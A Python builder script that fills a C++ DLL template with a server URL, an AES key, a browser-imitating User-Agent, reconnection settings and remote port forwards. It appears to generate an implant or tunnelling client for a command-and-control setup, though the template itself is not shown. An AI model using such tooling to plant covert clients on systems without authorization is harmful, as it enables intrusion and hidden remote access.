import argparse

from pathlib import Path

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"


def add_arguments(parser):
    builder = parser.add_argument_group("Builder options")
    builder.add_argument("--name", default="dllmain.cpp",
                     help="Name of the output.")

    cfg = parser.add_argument_group("Client configuration")
    cfg.add_argument("--server-url", default="localhost:8080",
                     help="Server URL the client should connect to.")
    cfg.add_argument("-e", "--encryption-key", default="",
                     help="AES encryption key to embed.")
    cfg.add_argument("--user-agent", default=USER_AGENT,
                     help="Custom HTTP/WebSocket User-Agent string.")
    cfg.add_argument("--retry-attempts", type=int, default=5,
                     help="Number of reconnection attempts after disconnect.")
    cfg.add_argument("--retry-duration", type=float, default=60.0,
                     help="Total duration in seconds spread across retry attempts.")
    cfg.add_argument("--remote-port-forwards", nargs="*", default=[],
                     help="Space delimited remote port forwards LISTENING-IP:LISTENING-PORT:REMOTE-IP:REMOTE-PORT.")


def build(args):
    template_path = Path(__file__).resolve().parent / "src" / "dllmain.cpp"
    if not template_path.is_file():
        raise RuntimeError(f"Template not found: {template_path}")

    content = template_path.read_text(encoding="utf-8")

    forwards_str = " ".join(args.remote_port_forwards) if args.remote_port_forwards else ""

    content = content.replace("{{ server_url }}", args.server_url)
    content = content.replace("{{ encryption_key }}", args.encryption_key)
    content = content.replace("{{ user_agent }}", args.user_agent)
    content = content.replace("{{ retry_attempts }}", str(args.retry_attempts))
    content = content.replace("{{ retry_duration }}", str(args.retry_duration))
    content = content.replace("{{ remote_port_forwards }}", forwards_str)

    out_path = Path(args.name)
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(content, encoding="utf-8")

    print(f"Wrote C++ DLL source to '{out_path}'")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(usage=argparse.SUPPRESS)
    add_arguments(parser)
    parsed_args = parser.parse_args()
    build(parsed_args)
